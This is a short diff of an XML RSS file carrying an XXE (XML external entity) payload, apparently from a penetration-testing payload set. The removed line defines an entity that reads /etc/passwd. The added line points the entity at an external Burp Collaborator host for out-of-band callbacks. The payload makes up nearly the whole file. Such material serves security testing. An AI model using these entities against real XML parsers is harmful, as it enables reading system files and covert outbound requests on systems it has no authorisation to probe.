@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!ENTITY xxe SYSTEM "https://xxe.akyifb724748wyovvmtuw86uyl4fs4.burpcollaborator.net/xxe.txt" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
   <title>W3Schools Home Page</title>
